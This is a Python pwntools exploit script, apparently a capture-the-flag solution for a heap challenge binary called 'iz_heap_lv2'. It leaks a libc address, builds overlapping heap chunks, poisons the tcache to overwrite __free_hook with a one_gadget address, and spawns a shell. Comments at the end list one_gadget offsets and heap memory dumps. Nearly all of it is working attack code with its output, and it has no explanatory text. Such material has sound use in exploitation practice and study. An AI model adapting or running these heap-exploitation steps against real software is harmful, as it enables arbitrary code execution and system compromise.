#!/usr/bin/python
from pwn import *

s = process('./iz_heap_lv2')

libc = ELF('./libc.so.6')

def add(size, data):
    s.sendlineafter('Choice: \n', '1')
    s.sendlineafter('size: ', str(size))
    s.sendafter('data: ', data)

def edit(index, data):
    s.sendlineafter('Choice: \n', '2')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('data: ', data)

def delete(index):
    s.sendlineafter('Choice: \n', str('3'))
    s.sendlineafter('index: ', str(index))

def show(index):
    s.sendlineafter('Choice: \n', '4')
    s.sendlineafter('index: ', str(index))
    return s.recvline()


# leak
add(0x417, 'A' * 0x417)
add(0x417, 'B' * 0x417)
delete(0)
delete(1)
add(0xf, 'a' * 0x8)       # [0]
leak = u64((show(0)[-7:-1]).ljust(8, '\x00'))
libc.address = leak - 0x3ebca0
hook = libc.sym['__free_hook']
oneshot = libc.address + 0x4f322
log.success('leak    = ' + hex(leak))
log.success('libc    = ' + hex(libc.address))
log.success('hook    = ' + hex(hook))
log.success('oneshot = ' + hex(oneshot))

# chunk overlap
add(0x417, 'b' * 0x417)   # [1]                        
add(0x28, 'c' * 0x28)     # [2]
add(0x4f8, 'd' * 0x4f8)   # [3]
add(0x27, 'e' * 0x27)     # [4]
delete(1)
edit(2, 'f' * 0x20 + p64(0x450))
delete(3)

# tcache poisoning
delete(2)
add(0x440, 'g' * 0x410 + p64(0x420) + p64(0x30) + p64(hook))
add(0x20, 'h' * 0x20)     # dummy
add(0x20, p64(oneshot))

'''
gdb.attach(s, """
x/320gx 0x603240
python print('------------------------')
heap chunks
python print('------------------------')
heap bins
""")
'''

# triggering oneshot
delete(0)

s.interactive()

'''
0x7ffff7dcfca0 - 0x7ffff79e4000 = 0x3ebca0

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x603680:	0x6262626262626262	0x6262626262626262
0x603690:	0x0000000000000420	0x0000000000000030
0x6036a0:	0x0000000000000000	0x6666666666666666
0x6036b0:	0x6666666666666666	0x6666666666666666
0x6036c0:	0x0000000000000450	0x0000000000000500
0x6036d0:	0x6464646464646464	0x6464646464646464
0x6036e0:	0x6464646464646464	0x6464646464646464

=>

0x603680:	0x6767676767676767	0x6767676767676767
0x603690:	0x0000000000000420	0x0000000000000030
0x6036a0:	0x00007ffff7dd18e8	0x6666666666666666
0x6036b0:	0x6666666666666666	0x6666666666666666
0x6036c0:	0x0000000000000400	0x0000000000000501
0x6036d0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x6036e0:	0x0000000000000000	0x0000000000000000
0x6036f0:	0x6464646464646464	0x6464646464646464

'''
